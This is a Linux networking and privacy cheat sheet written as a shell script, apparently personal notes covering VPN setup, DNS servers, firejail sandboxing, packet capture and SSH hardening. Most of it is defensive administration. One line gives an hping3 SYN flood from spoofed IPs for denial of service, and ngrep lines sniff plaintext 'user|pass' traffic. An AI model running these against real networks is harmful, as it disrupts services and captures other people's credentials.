#!/bin/sh
##-===========================================================-##
##      [+] Xe1phix-Secure-Linux-Networking-Cheatsheet-Notes-[v*.*.*].sh
##-===========================================================-##


.*[.](mkv|avi|mp4)



##-======================================-##
##      [+] Mullvad VPN - Public DNS
##-======================================-##	

## ------------------------------------------ ##			## --------------------------------------------------------------------------------------------------------------------------------------------- ##
nameserver 193.138.218.74								##    [?] Stable											##  [?]  Public Non-logging DNS server
## nameserver 193.138.219.228						##    [?] Expired March 20th 2019		##  [?]  https://mullvad.net/en/blog/2019/2/20/our-public-dns-changing/
## ------------------------------------------ ##			## --------------------------------------------------------------------------------------------------------------------------------------------- ##




##-==================================-##
##     [+] ParrotSec / OpenNIC  Nameservers:
##-==================================-##
nameserver 139.99.96.146
nameserver 37.59.40.15
nameserver 185.121.177.177


##-======================================-##
##      [+] ParrotSec / OpenNIC  Nameservers:
##-======================================-##
## ------------------------------------------------------------------ ##
##     [?] Owner: ParrotSec  (Lorenzo "Palinuro" )
## ------------------------------------------------------------------ ##
nameserver 198.98.49.91					##  ns2.us.dns.opennic.glue
nameserver 45.79.57.113					##  ns3.us.dns.opennic.glue


##-=========================-##			## --------------------------------------------------------- ##
##	  [+] OpenNIC NameServers						##     [?] https://servers.opennicproject.org
##-=========================-##			## --------------------------------------------------------- ##
nameserver 172.98.193.42								##     [?]  Stable as of  '[09-15-20]'										##  (ns1.nc.us)	
nameserver 50.116.17.96									## --------------------------------------------------------- ##			##  (ns5.tx.us)
nameserver 155.138.240.237							##     [?] <--- Your closest servers										##  (ns1.tx.us)
nameserver 162.243.19.47								## --------------------------------------------------------- ##			##  (ns6.ny.us)	






##-======================================-##	
##	    [+] Checking the connection using nmcli:
##-======================================-##	
nmcli con show
nmcli connection show --active



##-==============================-##	
##	    [+] Bring The connection Down:
##-==============================-##	
nmcli con down "Wired connection 1"


iface eth0 inet static
	address 192.168.1.101
	

        dns-nameservers 139.99.96.146,185.121.177.177,37.59.40.15




## ----------------------------------------------------------------------------------- ##
##     [?] See where a shortened url takes you before click
## ----------------------------------------------------------------------------------- ##
check(){ curl -sI $1 | sed -n 's/Location: *//p';}
curl -sI $URL | sed -n 's/location: *//p'


##-==============================-##	
##	    [+] perl regex to get URLs.
##-==============================-##	
grep -P -o '(?<=href=")http:\S+(?=")' *.html


##-=========================-##	
##	    [+] Curl – Follow Redirect
##-=========================-##	
curl -Iks --location -X GET -A "x-agent" $1




##### Check is Telegram notification enable, If enabled send message to telegram
curl -X POST "https://api.telegram.org/bot$telegramToken/sendMessage" -d "chat_id=$chatId&text=$messageToSend"




cat /etc/apt/sources.list.parrot 
cat /etc/apt/sources.list
cat /etc/apt/sources.list.d/parrot.list 





rm -f /etc/apt/sources.list.d/parrot.list
rm -f /etc/apt/sources.list.parrot
echo "deb http://deb.debian.org/debian stretch main contrib non-free" > /etc/apt/sources.list
echo "deb-src http://deb.debian.org/debian stretch main contrib non-free" >> /etc/apt/sources.list
echo "deb http://deb.debian.org/debian stretch-updates main contrib non-free" >> /etc/apt/sources.list
echo "deb-src http://deb.debian.org/debian stretch-updates main contrib non-free" >> /etc/apt/sources.list
echo "deb http://security.debian.org/debian-security/ stretch/updates main contrib non-free" >> /etc/apt/sources.list
echo "deb-src http://security.debian.org/debian-security/ stretch/updates main contrib non-free" >> /etc/apt/sources.list
echo "" >> /etc/apt/sources.list
echo "## deb http://deb.parrotsec.org/parrot stable main contrib non-free" >> /etc/apt/sources.list
echo "## deb-src http://archive.parrotsec.org/parrot stable main contrib non-free" >> /etc/apt/sources.list





chmod -v 744  -R $DirPath


 && 

chown -v -R parrotsec-kiosk $DirPath
chown -v -R nobody $DirPath
chown -v -R root $DirPath







## ========================================= ##
##  [+] Mullvad Certificates & Locations: 
## ========================================= ##
## 
## ----------------------------------------- ##
## 	[+] User Certificate => mullvad.crt
## ----------------------------------------- ##
## 		[+] CA Certificate => ca.crt
## ----------------------------------------- ##
## 	  [+] Private Key => mullvad.key
## ----------------------------------------- ##
##

*  The root certificate (CA): `ca.crt`.
*  Client certificate: `client1.crt`.
*  Client key: `client1.key`.
*  HMAC secret key: `ta.key`.
*  Client configuration file: `client.ovpn`.

## ========================================= ##



echo "##-=================================================-##"
echo "##     [+] Turn on The Immutable Bit For The VPN Keys & Certs:			 " 
echo "##-=================================================-##"
chattr +i /etc/openvpn/mullvad_ca.crt
chmod -v 0644 mullvad_ca.crt 
chown -v root mullvad_ca.crt
chattr +i /etc/openvpn/mullvad_crl.pem
chmod -v 0644 mullvad_crl.pem
chmod ug+r mullvad_userpass.txt
chown -v root mullvad_userpass.txt


sudo chmod -v 0644 mullvad_ca.crt 
sudo chmod -v 0644 mullvad_crl.pem 
sudo chmod ug+r mullvad_userpass.txt
cp /etc/resolv.conf ~/Scripts/resolv.conf.ovpnsave
chmod 644 ~/Scripts/resolv.conf.ovpnsave
sudo chown -v root mullvad_userpass.txt
sudo chown -v root mullvad_crl.pem 
sudo chown -v root mullvad_ca.crt



echo "## =========================================================== ##"
echo "   [+] Copy the mullvad config files to /etc/openvpn folder:"
echo "## =========================================================== ##"
sudo cp -v mullvad_ca.crt /etc/openvpn/
sudo cp -v mullvad_crl.pem /etc/openvpn/ 
sudo cp -v mullvad_se.conf /etc/openvpn/
sudo cp -v mullvad_se-modified.conf /etc/openvpn/
sudo cp -v mullvad_userpass.txt /etc/openvpn/
sudo cp -v update-resolv-conf /etc/openvpn/


cp -v mullvad_ca.crt /etc/openvpn/ && cp -v mullvad_se_sto.conf /etc/openvpn/ && cp -v mullvad_userpass.txt /etc/openvpn/ && cp -v update-resolv-conf /etc/openvpn/



echo "##-==================================-##"
echo "         [+] Fetch Mullvads GPG Signing Key:		 		"
echo "##-==================================-##"
gpg --keyserver pool.sks-keyservers.net --recv-keys A1198702FC3E0A09A9AE5B75D5A1D4F266DE8DDF


echo "##-==================================-##"
echo "         [+] Import Mullvads GPG Signing Key:				 "
echo "##-==================================-##"
gpg --keyid-format 0xlong --import mullvad-support-mail.asc
gpg --keyid-format 0xlong --import mullvad-code-signing.asc


echo "##-==================================-##"
echo "          [+] Print Mullvads GPG Fingerprints:				 "
echo "##-==================================-##"
gpg --keyid-format 0xlong --fingerprint 0xA1198702FC3E0A09A9AE5B75D5A1D4F266DE8DDF


echo "##-===================================-##"
echo "         [+] Mullvads GPG Fingerprints (Verified):			"
echo "##-===================================-##"
echo "Primary key fingerprint: A119 8702 FC3E 0A09 A9AE  5B75 D5A1 D4F2 66DE 8DDF"


echo "##-===========================-##"
echo "          [+] Sign Mullvads GPG Key:				"
echo "##-===========================-##"
gpg --lsign A1198702FC3E0A09A9AE5B75D5A1D4F266DE8DDF				## gpg --edit-key A1198702FC3E0A09A9AE5B75D5A1D4F266DE8DDF



echo "##-=====================================================-##"
echo "          [+] Verify Mullvads .deb against Their Published Signed .asc:					"
echo "##-=====================================================-##"
gpg --keyid-format 0xlong -v --verify MullvadVPN-2020.5_amd64.deb.asc MullvadVPN-2020.5_amd64.deb






    export OVPN_SERVER_ROOT="/etc/openvpn"
      export OVPN_SERVER_IP=$(curl http://ipecho.net/plain)
    export OVPN_SERVER_PORT="80"
export OVPN_SERVER_PROTOCOL="UDP"
    export OVPN_SERVER_NAME="${OVPN_SERVER_PORT}${OVPN_SERVER_PROTOCOL}"
  export OVPN_SERVER_CIPHER="AES-128-CBC"
        export RSA_KEY_SIZE="3072"
         export DH_KEY_SIZE="3072"
       export EASY_RSA_ROOT="${OVPN_SERVER_ROOT}/easy-rsa"




./easyrsa init-pki
./easyrsa --batch build-ca nopass
./easyrsa build-client-full client nopass


openssl dhparam -out dh.pem ${DH_KEY_SIZE}

EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl

# Generate TLS-auth key.
openvpn --genkey --secret /etc/openvpn/tls-auth.key

cp ca.crt ca.key dh.pem crl.pem /etc/openvpn/





# Generate client configuration file.
cat > ${OVPN_SERVER_ROOT}/client.ovpn << EOF


client
port ${OVPN_SERVER_PORT}
proto ${OVPN_SERVER_PROTOCOL,,}
remote ${OVPN_SERVER_IP} ${OVPN_SERVER_PORT}
dev tun
user nobody
group nobody
persist-key
persist-tun
push "dhcp-option DNS 208.67.222.222"
push "dhcp-option DNS 208.67.220.220"
push "redirect-gateway def1 bypass-dhcp"
crl-verify crl.pem
ca ca.crt
tls-auth tls-auth.key 0
dh dh.pem
auth SHA256
cipher AES-128-CBC
tls-version-min 1.2
tls-cipher TLS-DHE-RSA-WITH-AES-128-GCM-SHA256
duplicate-cn
compress lzo
EOF


sed 























https://mullvad.net/en/check/
https://mullvad.net/en/help/dns-leaks/
https://mullvad.net/en/help/different-entryexit-node-using-wireguard-and-socks5-proxy/
https://mullvad.net/en/help/wireguard-and-mullvad-vpn/

wg-quick up mullvad-se9

apt-get install openresolv
systemctl enable openvpn-client@mullvad.service
systemctl enable wg-quick@mullvad-se4


kill -HUP /run/openvpn/$1.pid



sudo chown root:root -R /etc/wireguard && sudo chmod 600 -R /etc/wireguard
wg-quick up mullvad-se4

sysctl net.ipv4.ip_forward=1

PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o wg1 -j MASQUERADE
PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o wg1 -j MASQUERADE



193.138.218.74


sudo service openvpn start
sudo nohup openvpn --config /etc/openvpn/mullvad_xx.conf


magnet:?xt=urn:btih:fc750867386654ea1c2797a057c107ed360a7765&dn=am.i.mullvad.net&tr=http%3A%2F%2Fam.i.mullvad.net%3A6969%2Fannounce
magnet:?xt=urn:btih:fc750867386654ea1c2797a057c107ed360a7765&dn=am.i.mullvad.net&tr=udp%3A%2F%2Fam.i.mullvad.net%3A6969




cp -v mullvad_se.conf /etc/openvpn/
chmod -v 0755 /etc/openvpn/update-resolv-conf






protonvpn examples
protonvpn init

protonvpn-cli login [ProtonVPN username]
protonvpn-cli connect
protonvpn-cli status

protonvpn-cli netshield --off
protonvpn-cli netshield --ads-malware
protonvpn-cli netshield --malware

## ProtonVPN kill switch
protonvpn-cli ks --on
protonvpn-cli ks --always-on

protonvpn-cli config --help



nmcli connection show --active

http://robtex.com/
https://dnsdumpster.com/

https://shodan.io/





https://hackertarget.com/dns-lookup/
http://searchdns.netcraft.com/
https://hackertarget.com/zone-transfer/
https://scans.io/
https://hackertarget.com/find-shared-dns-servers/
https://hackertarget.com/reverse-dns-lookup/

https://hackertarget.com/wp-content/uploads/2018/03/osint-map.png


https://hackertarget.com/ssl-check/


/home/parrotsec-kiosk/Downloads/Audio/BruceLee-BeLikeWater-Inspirational.mp4



Private-Non-Persistent-Sandbox
Private-Non-Persistent-Sandbox
discarded

Mount-bind


nonewprivs
read-write
read-only
whitelisted

jail
temporary filesystem

Mount  a  filesystem overlay


filesystem container, the system  directories  are  mounted  read-
              write.  All  filesystem  modifications  go  into the overlay.
overlay is  stored
              in  $HOME/.firejail/<NAME>  directory.   The created overlay can be reused

nonewprivs and a default capabilities filter
Linux capabilities filter
Drop all capabilities


IPC namespace
IPC namespace-sandbox



/etc/firejail/firejail.config

Blacklist-

cgroup

apparmor_status --verbose


./configure --prefix=/usr --enable-apparmor/
apparmor_parser -r /etc/apparmor.d/firejail-default
/etc/apparmor.d/local/firejail-default

~/.config/firejail/
/home/parrotsec-kiosk/.config/firejail/
/home/$User/.config/firejail/$Profile.profile

apparmor_parser -r /etc/apparmor.d/usr.sbin.NetworkManager
apparmor_parser -r /etc/apparmor.d/*
/etc/init.d/apparmor start
/etc/init.d/apparmor restart

sudo apparmor_parser -R /etc/apparmor.d/usr.bin.thunderbird

firejail --profile=/etc/firejail/firefox.profile --protocol=unix,inet,netlink,packet --dns=193.138.218.74 --dns=10.8.0.1 --dns=139.99.96.146 /usr/bin/firefox



firejail --interface=eth1 --interface=eth0.vlan100






getfattr -d -m "^security\\." /usr/bin/ping

getcap /usr/bin/ping

/usr/bin/ping = cap_net_raw+ep



setcap cap_net_admin,cap_net_raw+ep /usr/bin/nethogs



cgroupfs-mount.service 



atk6-trace6 --help

trace6 -d eth0 $TargetAddress $Port 
basic but very fast traceroute6





./firetor.sh --caps.drop=all curl https://3g2upl4pq6kufc4m.onion/






sysctl -w net.ipv6.conf.all.disable_ipv6=1
sysctl -w net.ipv6.conf.default.disable_ipv6=1

# Prevent the IPv6 kernel module (ipv6) from loading the IPv6 networking stack
echo "options ipv6 disable=1" > /etc/modprobe.d/ipv6.conf

echo 1 > /proc/sys/net/ipv4/ip_forward



## IP address of the VPN server.
## Get the IP using: 
nslookup se.mullvad.net
nslookup se-sto.mullvad.net

ping se1-bridge.mullvad.net
ping se2-bridge.mullvad.net

mtr --no-dns --report 
mtr --report www.google.com

mtr --tcp --port 80 --report --report-cycles 10 speedtest.dallas.linode.com
sudo mtr --tcp --port 22 --report --report-cycles 10 50.116.25.154

mtr -rwc 50 -rw 198.51.100.0
mtr -rw 198.51.100.0


dig +short myip.opendns.com @resolver1.opendns.com
dig +trace 






service network status
systemctl status networking.service -l
journalctl -u networking --no-pager | tail -20

networkctl status
systemctl status systemd-networkd -l
journalctl -u systemd-networkd --no-pager | tail -20

systemctl list-units --type=service
service --status-all



service --status-all | grep running
service --status-all | grep running... | sort
chkconfig --list
chkconfig --add

systemctl list-units | grep .service
systemctl list-units | grep .target
systemctl list-unit-files --type=service
systemctl list-unit-files --type=target
systemctl list-unit-files --type=service | grep -v disabled


systemctl --all list-unit-files
systemctl --all --show-types

systemctl show --property "Wants" multi-user.target
systemctl show --property "Requires" multi-user.target
systemctl show --property "WantedBy" getty.target
systemctl show --property "Wants" multi-user.target | fmt -10 | sed 's/Wants=//g' | sort


systemctl status $Service | grep -i active





ssl-apache2-debian-ubuntu-SSL_Certificates_with_Apache_on_Debian






firewall-cmd --state
iptables -L
iptables-save > ~/iptables.txt

iptables -t nat -F
iptables -t mangle -F
iptables -F
iptables -X




tcpdump -i eth1 -s 0 -l -nn port 443 -w metasploit_update.pcap
tcpdump -r metasploit_update.pcap -s 0 -nn -X

tcpdump -i eth0 -l -nn port 53 and host 234.50.X.X -s 0 -X


tcpdump -i eth0 -l -nn -s 0 udp port 62201 -w $File.pcap
tcpdump -l -nn -X -r $File.pcap | head

tcpreplay -i eth0 $File.pcap












DNS servers were used by the clients for domain name resolutions?

tshark -r $File.pcap -Y "dns && dns.flags.response==0" -Tfields -e ip.dst









##-===================================================-##
##     [+] CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
##-===================================================-##
tcpdump -i ethO -c 50 -tttt 'udp and port 53'


cat /var/log/messages | grep DHCP


tcpdump -An "tcp" | grep "www"






tcpdump 
tcpdump 
tcpdump port 1080
-i eth0 -X port \(110 or 143\)
tcpdump -i eth0 -l -nn port 53

tcpdump -lnni eth0 'udp port 53'

tcpdump –r $File –x ‘dst port 31789’


##  Examining Port 31789
Records With tcpshow
tcpdump –r $File –enx ‘dst port 31789’ | tcpshow -nolink


http://www.cipherdyne.org/LinuxFirewalls

## DoS FROM SPOOFED IPs
hping3 targetiP --flood --frag --spoof ip --destport $PortNum --syn



tail /var/log/messages |grep ICMP |tail -n 1

tail /var/log/messages | grep UDP | tail -n 1


tcpdump -i eth1 -l -nn -s 0 -X -c 1 port

tcpdump -A -i eth0 'tcp port 21'




##-=====================================-##
##     [+] Capture DHCP Request And Replies:
##-=====================================-##
## --------------------------------------------------------------------------------------------- ##
##    [?] DHCP requests are seen on port 67 and the reply is on 68.
## --------------------------------------------------------------------------------------------- ##
tcpdump -v -n port 67 or 68



## record the capture data to a file.
tcpdump -i eth0 udp port 53 -w $File.pcap



## read the results of the capture.
tcpdump -n -t -r $File.pcap port 53





Show only up to the first 10 packets by each source IP:

tcpdump -nn ip | awk '{s=$3;sub(/\.[0-9]+$/,"",s);if(a[s]++<10){print}}'




dhcpdump
dumpcap
pcapdump
tcpslice
tshark



##-========================-##
##     [+] Capture SYN Packets:
##-========================-##
tcpdump -d 'tcp[13] & 2 = 2' >/dev/null | grep -B 1 -A 2 0x2
tcpdump -nnr $File.pcap -c 3 'tcp[13] & 2 = 2' | grep -E '(S|S\.)'



##-=========================================-##
##     [+] Capture Packets Coming From $Domain
##-=========================================-##
tcpdump -i any -w $File.pcap -n "host $(dig +short $Domain)"


tcpdump -i xl0 'tcp[13] & 2 == 2'

atch packets which  have only SYN set:
tcpdump -i xl0 tcp[13] == 2



the PSH bit is bit number 3
the URG bit is bit number 5

                       |C|E|U|A|P|R|S|F|
                       |---------------|
                       |0 0 0 0 0 0 1 0|
                       |---------------|
                       |7 6 5 4 3 2 1 0|

       Looking at the control bits section we see that only bit number 1 (SYN) is set.



CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE
tcpdump -i ethO -XX -w $File.pcap


tcpdump host 10.0.0.1 && host 10.0.0.2            # Traffic between these hosts
tcpdump tcp dst port 80 or 8080                        # Packets to either TCP port

CAPTURE HTTP TRAFFIC TO2 .2 .2 .2
tcpdump -i ethO port 80 dst 2.2.2.2

SHOW CONNECTIONS TO A SPECIFIC IP
tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24

PRINT ALL PING RESPONSES
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'

CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
tcpdump -i ethO -c 50 -tttt 'udp and port 53'


tcpdump -As80 -tni eth0 "udp port 53"


PORTS_USED=`netstat -antl |grep LISTEN | awk '{ print $4 }' | cut -d: -f2|sed '/^$/d'|sort`


SSL/TLS ports and versions
'mac-sha384-sha256-poly1305'


https://github.com/DenizParlak/Zeus


tcpdump -i eth0 443, 80, 88 8443 -w TelegramPCAP.pcap




https://gist.githubusercontent.com/markuskont/c7a314d0fdf4767e5f87f6963a660490/raw/0d7dc0aedd5fcfd49f3ebc2aa3dae5b6ae9e0007/150-syslog-ng-share.conf





dbus-send --print-reply --dest="org.gnome.Shell" /org/gnome/SessionManager/EndSessionDialog org.gnome.SessionManager.EndSessionDialog.Open uint32:2 uint32:0 uint32:60 array:objpath:/org/gnome/SessionManager/EndSessionDialog
# Reboot directly:
dbus-send --system --print-reply --dest=org.freedesktop.login1 /org/freedesktop/login1 "org.freedesktop.login1.Manager.Reboot" boolean:true

# Logout
# Only works for non-scripted usage?
loginctl kill-session $XDG_SESSION_ID;loginctl terminate-session $XDG_SESSION_ID





ss -o state established '( dport = :ssh or sport = :ssh )'

pgrep -u root sshd


kill -HUP `lsof -t /usr/sbin/sshd`
lsof -i tcp:ssh
lsof -i tcp:22
lsof -i | grep openvpn
lsof -Pni | grep 
lsof -i TCP:80


lsof -iTCP:3000 -sTCP:LISTEN -n -P will yield the offender so this process can be killed.



function killport() {
  lsof -i tcp:$1 | awk '(NR!=1) && ($1!="Google") && ($1!="firefox") {print $2}' | xargs kill
}





Search network traffic for string "User-Agent: "
ngrep -d eth0 "User-Agent: " tcp and port 80


Search network packets for GET or POST requests :

ngrep -l -q -d eth0 "^GET |^POST " tcp and port 80


ngrep -d any port 25

monitor all activity crossing source or destination port 25
(SMTP).



ngrep -wi -d wlan0 'user|pass' port 6667

ngrep -wi -d any 'user|pass' port 21






ngrep -d eth0 port 80

ngrep -q -W byline "GET|POST HTTP"


systemctl enable nfdump.service
systemctl start nfdump.service


print the data through nfdump
nfdump -R /var/cache/nfdump


## Ndfump to manage the flows
nfdump -r nfcapd.2017xxxxx -o extended -o csv -q


Convert to CSV
nfdump -r file -o csv > output.csv


Filter IP
nfdump -r [input file] 'net 8.8.8.8/32'




nft list ruleset

##### iftop #####
#Monitor network traffic on selected interface
iftop -i eth0

iw wlan0 info



##  Display HTTP connections:
ss -o state established '( dport = :http or sport = :http )'


List open ports on Linux:

netstat -an --inet | grep LISTEN | grep -v 127.0.0.1

ss -l     (all open ports)

ss -nlp

SSH traffic:
darkstat -i fxp0 -f "port 22"
darkstat -i fxp0 -f "port 1194"
darkstat -i fxp0 -f "port 443"



1194


ssldump
tls

chkconfig --list
service --status-all | grep -v not running
service --status-all | grep -v running









##-======================================-##
##     [+] Kill a process running on port 8080
##-======================================-##
lsof -i :8080 | awk '{l=$2} END {print l}' | xargs kill


##-=================================-##
##      [+] Show Processes Ran By SSHD
##-=================================-##
lsof -p $( pgrep sshd )
lsof -p $( pgrep NetworkManager )
lsof -p $( pgrep firefox )


List 10 largest open file on Unix:

lsof /|awk '{ if($7>1048576) print $7/1048576 "MB" " " $9 " " $1 }


find . -type f -exec du -k {} \; | sort -nrk 1 | head			# find the largest files



watch --color -n 1 lsof -u syslog
watch --color -n 1 lsof +d /var/log
watch --color -n 1 lsof -i udp -u root





while :; do kill -9 `lsof -t -i :47145`; done

 
 

ps -eo pid,user,group,gid,vsz,rss,comm --sort=-rss | less

ps -ef --sort=user | less

watch --color -n 1 lsof -iTCP -sTCP:LISTEN

kill $(ps -ef | awk '/firefox/ {print $2}')

pgrep -u root,firefox





echo "displays the location of each memory region that is being copied"
pcat -v <PID> > /home/poo/xntps.pcat


echo "Libraries loaded of a running process with pmap"
pmap -d 7840



/proc/<PID>/exe
/proc/<PID>/cwd




echo "[+] Display the top ten running processes - sorted by memory usage"
ps aux | sort -nk +4 | tail



watch --color -n 1 lsof +d /var/log



follow pid and its children, writing to "smtpd.":

strace -p 927 -o smtpd -ff -tt


strace -p "`pidof dead_loop`"

strace -p "`pgrep dead_loop`"


INPUT -p tcp -m multiport --destination-ports 22,

ip.addr==192.168.150.1 && !(tcp.port==22)

DNS Zone Transfer request 
(tcp.dstport == 53) && (dns.flags.response == 0) && (dns.qry.type == 0x00fc) 
DNS Zone Transfer response
(tcp.srcport == 53) && (dns.flags.response == 1) && (dns.qry.type == 0x00fc)
DNS pointer(PTR) query/response
dns.qry.type == 12
udp.port == 53

Ping sweep
icmp.type == 8 || icmp.type == 0
ICMP Type 8 = ECHO Request
ICMP Type 0 = ECHO Reply
icmp || icmpv6


## captures traffic on a remote machine with tshark
ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -

## analyze traffic remotely over ssh w/ wireshark
ssh root@HOST tcpdump -U -s0 -w - 'not port 22' | wireshark -k -i -



echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6




iw --help | cut -c2-199 | grep "dev <devname>"
dev <devname> station dump

dev <devname> auth <SSID> <bssid> <type:open|shared> <freq in MHz> [key 0:abcde d:1:6162636465]
dev <devname> connect [-w] <SSID> [<freq in MHz>] [<bssid>] [key 0:abcde d:1:6162636465] [mfp:req/opt/no]
dev <devname> disconnect


dev <devname> switch channel <channel> [NOHT|HT20|HT40+|HT40-|5MHz|10MHz|80MHz] [beacons <count>] [block-tx]
dev <devname> switch freq <freq> [NOHT|HT20|HT40+|HT40-|5MHz|10MHz|80MHz] [beacons <count>] [block-tx]
dev <devname> switch freq <control freq> [5|10|20|40|80|80+80|160] [<center1_freq> [<center2_freq>]] [beacons <count>] [block-tx]
dev <devname> info

dev <devname> interface add <name> type <type> [mesh_id <meshid>] [4addr on|off] [flags <flag>*] [addr <mac-addr>]
dev <devname> link
d

dev <devname> mesh leave
dev <devname> mesh join <mesh ID> [[freq <freq in MHz> <NOHT|HT20|HT40+|HT40-|80MHz>] [basic-rates <rate in Mbps,rate2,...>]], [mcast-rate <rate in Mbps>] [beacon-interval <time in TUs>] [dtim-perio
dev <devname> mgmt dump frame <type as hex ab> <pattern as hex ab:cd:..> [frame <type> <pattern>]* [count <frames>]
dev <devname> mpath dump




iwlist  wlp1s0 scan
iwlist wlp1s0 scan | grep -i essid
iw wlp1s0 connect BB
iwconfig wlp1s0 essid BB



iw dev %s set channel %s


##  Setting %s to frequency: %s MHz (Channel: %s)
iw dev %s set freq %s




/home/parrotsec-kiosk/Downloads/Scripts/Wiki/content-lpic2-202-prep



ip addr show
ip a show eth0
ip link set eth0 [up/down]

netstat -rn
route -n















nmcli device modify eth0 ipv6.never-default yes
nmcli device modify eth0 ipv6.method ignore
nmcli device modify eth0 -ipv6.ignore-auto-dns yes
nmcli device modify eth0 -ipv6.ignore-auto-routes yes




nmcli device show
nmcli device status
nmcli general status
nmcli -t device
nmcli connection show
nmcli dev status STATE
nmcli dev status CONNECTION

nmcli radio wifi on
nmcli con up id eth0
nmcli con up id wlan0
nmcli dev disconnect eth0
nmcli dev disconnect wlan0
nmcli -p con up ifname wlan0
nmcli device wifi list
nmcli device wifi list bssid




nmcli connection show
nmcli connection show Ethernet\ connection\ 1
nmcli -f GENERAL,WIFI-PROPERTIES dev show eth0 
nmcli -f GENERAL dev show eth0 
nmcli --overview general permissions

nmcli device modify eth0 ipv6.never-default yes
nmcli device modify eth0 ipv6.method ignore
nmcli device modify eth0 -ipv6.ignore-auto-dns yes
nmcli device modify eth0 -ipv6.ignore-auto-routes yes





pkaction --action-id org.freedesktop.NetworkManager.network-control --verbose

nmcli -p -f general,wifi-properties device show
nmcli connection edit type ethernet
nmcli> set connection.autoconnect no

nmcli -t -c auto radio wwan off

set ipv6.method ignore
set ipv4.dns 139.99.96.146,185.121.177.177
set ipv6.ignore-auto-dns yes
set ipv6.dhcp-send-hostname no
set 802-3-ethernet.wake-on-lan ignore

set ipv6.ignore-auto-dns yes
set ipv6.ignore-auto-routes yes
set ipv6.never-default yes
set connection.zone Drop
nmcli -t -c auto general logging level DEBUG 

mcli -p -f general,wifi-properties device show wlan0

nmcli> set ipv4.dns 92.222.97.145 192.99.85.244		## ParrotDNS
nmcli> set ipv4.dns 185.121.177.177					## OpenNIC



nmcli connection modify Wired\ connection\ 1 ipv6.dhcp-send-hostname no
802-3-ethernet.wake-on-lan ignore
ipv6.method ignore
ipv6.ignore-auto-dns yes
ipv6.dhcp-send-hostname no
ipv6.ignore-auto-dns yes
ipv6.ignore-auto-routes yes
ipv6.never-default yes


ipv4.dns 193.138.218.74,
ipv4.dns 198.98.49.91,45.79.57.113,193.138.218.74



nmcli device set autoconnect no

nmcli> set ipv6.method ignore
nmcli> set 802-3-ethernet.wake-on-lan ignore
nmcli> set ipv6.never-default yes
nmcli> set connection.autoconnect no
nmcli> set ipv6.ignore-auto-dns yes
nmcli> set ipv6.dhcp-send-hostname no
nmcli> set ipv4.dns 198.98.49.91,193.138.218.74
nmcli> set ipv6.ignore-auto-routes yes


nmcli connection import type wireguard file configuration_file
nmcli con import type openvpn file /etc/openvpn/$VPNProfile.ovpn

nmcli connection up mullvad_se_sto




Add a new bridge:
nmcli con add type bridge ifname br0

Turn on br0:
nmcli con up br0


curl -o /etc/sks-keyservers.netCA.pem https://sks-keyservers.net/sks-keyservers.netCA.pem








h




ssh-keygen -b 4096
ssh-keygen -t RSA -b 4096
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
ssh-keygen -t rsa -b 4096 -f ssh_host_key -C '' -N ''
chown root:root /etc/ssh/ssh_host_key{,.pub}
curl -o /etc/ssh/sshd_config https://raw.githubusercontent.com/drduh/config/master/sshd_config


cat ~/.ssh/id_rsa.pub
scp .ssh/$SSHKey.pub root@192.168.51.254:.ssh/
scp ~/.ssh/id_rsa.pub example_user@203.0.113.10:~/.ssh/authorized_keys

## test if SSH over the HTTPS port is possible, run this SSH command:
ssh -T -p 443 git@ssh.github.com


# Copy your SSH public key on a remote machine for passwordless login - the easy way
ssh-copy-id $User@$Hostname
ssh-copy-id -i ~/.ssh/id_rsa.pub $User@$IP
ssh-copy-id -i ~/.ssh/id_rsa.pub "-p 2222 $User@$IP"

# Copy ssh keys to user@host to enable password-less ssh logins.
ssh-copy-id user@host


##  Test the connection:
ssh -i ~/.ssh/id_rsa $User@$IP



mkdir ~/.ssh; touch ~/.ssh/authorized_keys; chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys


# Copy your ssh public key to a server from a machine that doesn't have ssh-copy-id
cat ~/.ssh/id_rsa.pub | ssh user@machine "mkdir ~/.ssh; cat >> ~/.ssh/authorized_keys"
ssh user@example.com "echo `cat ~/.ssh/uploaded_key.pub` >> ~/.ssh/authorized_keys"


Copy the *public key* into the `~/.ssh/authorized_keys` file on the **remote machine**, using the following command. Substitute your own SSH user and host names:
scp ~/.ssh/id_rsa.pub user@example.com:/home/user/.ssh/uploaded_key.pub


Copy the public key to the server into the ~/.ssh folder:
scp .ssh/puttykey.pub root@192.168.51.254:.ssh/



## SFTP and SCP and PATH NAMES
curl ‐u $USER sftp://home.example.com/~/.bashrc





AddressFamily inet
PermitRootLogin no
PasswordAuthentication no
AllowUsers todd
AllowUsers clark dan@192.168.5.200 eva
	Protocol 2
PubkeyAuthentication yes
LogLevel VERBOSE
AuthorizedKeysFile .ssh/authorized_keys
PasswordAuthentication no
PermitEmptyPasswords no
PermitRootLogin no
UsePAM yes
ChallengeResponseAuthentication yes
# - Authentication order. First use public key then ask for 2FA. - #
AuthenticationMethods publickey,keyboard-interactive:pam
Subsystem sftp /usr/lib/ssh/sftp-server

# - Disable printing the MOTD as PAM does that. - #
PrintMotd no
# - Set default banner path. - #
Banner /etc/banner



# ======================= ADDITIONAL UNTOUCHED OPTIONS ======================= #

# - Ciphers and keying - #
# RekeyLimit default none

# - Logging - #
# SyslogFacility AUTH

# AuthorizedPrincipalsFile none
# AuthorizedKeysCommand none
# AuthorizedKeysCommandUser nobody

# - For this to work you'll also need host keys in /etc/ssh/ssh_known_hosts - #
# HostbasedAuthentication no

# - Change to yes if you don't trust ~/.ssh/known_hosts - #
# HostbasedAuthentication
# IgnoreUserKnownHosts no

# - Don't read the user's ~/.rhosts and ~/.shosts files - #
# IgnoreRhosts yes

# Kerberos options
# KerberosAuthentication no
# KerberosOrLocalPasswd yes
# KerberosTicketCleanup yes
# KerberosGetAFSToken no

# GSSAPI options
# GSSAPIAuthentication no
